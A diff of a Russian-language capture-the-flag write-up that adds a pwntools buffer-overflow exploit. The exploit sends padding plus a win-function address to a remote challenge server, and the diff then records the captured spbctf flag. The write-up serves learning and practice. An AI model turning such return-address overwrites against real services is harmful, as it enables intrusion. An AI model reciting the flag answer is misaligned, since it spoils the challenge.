@@ -17,4 +17,19 @@ p.sendline(b"AAAAAAAA" + p64(win_addr))
 p.interactive()
 
 ```
+![image](https://github.com/user-attachments/assets/bdec7ead-e676-4f20-acac-fc21bc677591) <br />
 
+Получилось, а значит можем запустить программу на сервере:
+
+```py
+from pwn import * 
+
+p = remote('109.233.56.90', 11600)
+win_addr = 0x402058
+p.sendline(b"AAAAAAAA" + p64(win_addr))
+p.interactive()
+```
+
+![image](https://github.com/user-attachments/assets/c86f4aa4-1813-4dd4-9966-ca2ec9cc49c4) <br />
+
+Ответ: `spbctf{b0e0b0cedc622b2396e0069cd5a5f568}`
